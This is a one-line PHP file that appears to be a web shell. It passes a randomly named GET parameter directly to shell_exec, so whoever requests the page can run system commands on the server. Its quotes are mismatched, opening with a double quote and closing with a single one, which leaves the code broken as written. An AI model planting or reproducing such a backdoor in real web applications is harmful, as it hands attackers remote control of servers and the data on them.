<?php
shell_exec($_GET["epbJtxBH']);
?>
